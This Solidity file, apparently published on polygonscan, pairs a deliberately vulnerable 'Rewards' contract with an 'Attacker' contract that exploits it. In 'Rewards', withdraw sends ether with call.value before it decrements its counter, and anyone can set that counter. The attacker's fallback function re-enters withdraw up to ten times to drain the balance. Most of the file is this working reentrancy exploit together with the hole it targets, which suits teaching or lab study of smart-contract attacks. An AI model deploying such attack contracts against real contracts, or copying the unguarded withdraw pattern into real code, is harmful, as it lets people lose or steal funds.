/**
 *Submitted for verification at polygonscan.com on 2022-05-31
*/

pragma solidity ^0.4.8;

contract Rewards {
    uint public gifts;

    function allowGifts(uint num_gifts) public { gifts = num_gifts; }

    function withdraw() public {
        uint _amount = 1 ether;
        if (gifts > 0) {
           if (!msg.sender.call.value(_amount)()) revert(); 
           gifts -= 1;
        }
    }

    function deposit() payable public {}

    function getBalance() public constant returns(uint) { 
        address a = this;
        return a.balance; 
    }    
}

contract Attacker {
    Rewards r;
    uint public count;
    event LogFallback(uint count, uint balance);

    constructor(address rewards) public payable { r = Rewards(rewards); }

    function attack() public { r.withdraw(); }

    function () payable public {
        count++;
        address a = this;
        emit LogFallback(count, a.balance);     // make log entry
        if(count < 10) r.withdraw();            // limit number of withdrawals
    }

    function getBalance() public constant returns(uint) { 
        address a = this;
        return a.balance;
    }    
}